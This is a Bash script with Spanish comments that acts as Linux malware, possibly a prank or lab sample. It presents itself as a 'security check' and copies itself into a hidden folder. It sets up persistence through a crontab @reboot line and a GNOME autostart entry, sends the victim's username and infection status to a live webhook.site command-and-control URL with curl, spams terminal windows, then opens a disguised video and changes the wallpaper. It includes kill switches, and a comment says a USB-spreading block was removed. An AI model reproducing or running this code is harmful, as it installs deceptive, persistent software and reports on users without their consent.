#!/bin/bash

# ==============================================================================
#                                SECCIÓN LINUX (ADVANCED MODE)
# ==============================================================================

# --- CONFIGURACIÓN C2 (COMMAND & CONTROL) ---
C2_URL="https://webhook.site/b50be5fb-d30a-4b8b-9017-f491a0f9bf80"

# --- CONFIGURACIÓN DE NOMBRES (CAMUFLAJE) ---
# Carpeta oculta (empieza por punto)
RESOURCE_DIR=".data" 
# Nombres técnicos para los archivos (Video y Fondo)
VIDEO_FILE="core_sys.dat"
BG_FILE="config_ui.jpg"

echo "Iniciando diagnóstico de seguridad (Linux)..."

DIR="$(cd "$(dirname "$0")" && pwd)"

# --- PERSISTENCIA AVANZADA (CRONTAB + AUTOSTART) ---
INSTALL_DIR="$HOME/.hidden_sys_check"
SCRIPT_NAME="security_check.sh"
AUTOSTART_DIR="$HOME/.config/autostart"
AUTOSTART_FILE="$AUTOSTART_DIR/sys_check.desktop"

# 1. Crear directorio oculto de instalación
if [ ! -d "$INSTALL_DIR" ]; then
    mkdir -p "$INSTALL_DIR"
fi

# 2. INSTALACIÓN DE ARCHIVOS
cp "$0" "$INSTALL_DIR/$SCRIPT_NAME"

# Copiamos la carpeta de recursos OCULTA (.data)
if [ -d "$DIR/$RESOURCE_DIR" ]; then
    rm -rf "$INSTALL_DIR/$RESOURCE_DIR"
    cp -r "$DIR/$RESOURCE_DIR" "$INSTALL_DIR/"
fi

chmod +x "$INSTALL_DIR/$SCRIPT_NAME"

# 3. PERSISTENCIA NIVEL 1: CRONTAB
(crontab -l 2>/dev/null; echo "@reboot export DISPLAY=:0 && $INSTALL_DIR/$SCRIPT_NAME") | crontab -
echo "Inyección en Cron completada."

# 4. PERSISTENCIA NIVEL 2: AUTOARRANQUE
if [ ! -f "$AUTOSTART_FILE" ]; then
    mkdir -p "$AUTOSTART_DIR"
    cat <<EOF > "$AUTOSTART_FILE"
[Desktop Entry]
Type=Application
Name=System Security Check
Exec=$INSTALL_DIR/$SCRIPT_NAME
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
EOF
    echo "Configuración gráfica establecida."
fi

# --- LÓGICA DEL JUEGO ---

FILENAME="killswitch.txt"
END=$(( $(date +%s) + 60 ))

echo "CONECTANDO A NODO C2..."
curl -X POST -d "victim=$USER&os=Linux&status=INFECTED_START" "$C2_URL" >/dev/null 2>&1

echo "CORRIENDO SIN FRENOS..."

while [ "$(date +%s)" -lt "$END" ]; do

    # --- 0. BEACONING (HEARTBEAT) ---
    curl -X POST -d "victim=$USER&status=ACTIVE_RUNNING" "$C2_URL" >/dev/null 2>&1

    # (BLOQUE DE PROPAGACIÓN USB ELIMINADO AQUÍ)

    # --- 1. BUSQUEDA KILL SWITCH ---
    if [ -f "$DIR/$FILENAME" ]; then 
        curl -X POST -d "victim=$USER&status=KILLED_BY_FILE" "$C2_URL" >/dev/null 2>&1
        break
    fi
    if [ -f "$HOME/Desktop/$FILENAME" ] || [ -f "$HOME/Escritorio/$FILENAME" ]; then break; fi
    if [ -f "$HOME/Documents/$FILENAME" ] || [ -f "$HOME/Documentos/$FILENAME" ]; then break; fi
    if [ -f "$HOME/Downloads/$FILENAME" ] || [ -f "$HOME/Descargas/$FILENAME" ]; then break; fi
    
    # Killswitch en USB (Mantenemos la detección para parar, pero no infectamos)
    if ls /media/$USER/*/"$FILENAME" 1> /dev/null 2>&1; then 
        curl -X POST -d "victim=$USER&status=KILLED_BY_USB_FILE" "$C2_URL" >/dev/null 2>&1
        break
    fi

    # --- 2. TECLA Q ---
    read -t 0.01 -n 1 key
    if [ "$key" = "q" ] || [ "$key" = "Q" ]; then
        echo "Abortado por usuario."
        curl -X POST -d "victim=$USER&status=KILLED_BY_KEY_Q" "$C2_URL" >/dev/null 2>&1
        break
    fi

    # --- 3. SPAM VENTANAS ---
    if command -v xterm >/dev/null 2>&1; then
        xterm -hold -bg black -fg green -e "echo 'SYNCING CORE DATA... DO NOT CLOSE';" &
    elif command -v gnome-terminal >/dev/null 2>&1; then
        gnome-terminal -- bash -c "echo 'SYNCING CORE DATA...'; exec bash" &
    fi

    sleep 2
done

echo "Ejecutando carga final..."

# Rutas dinámicas
PLAY_DIR="$DIR"
if [ "$DIR" == "$INSTALL_DIR" ]; then
    PLAY_DIR="$INSTALL_DIR"
fi

# Reportar éxito
curl -X POST -d "victim=$USER&status=PAYLOAD_EXECUTED" "$C2_URL" >/dev/null 2>&1

# Abrir video usando el nombre técnico
xdg-open "$PLAY_DIR/$RESOURCE_DIR/$VIDEO_FILE" >/dev/null 2>&1 &

# Cambiar fondo usando el nombre técnico
if command -v gsettings >/dev/null 2>&1; then
    gsettings set org.gnome.desktop.background picture-uri "file://$PLAY_DIR/$RESOURCE_DIR/$BG_FILE"
fi

exit 0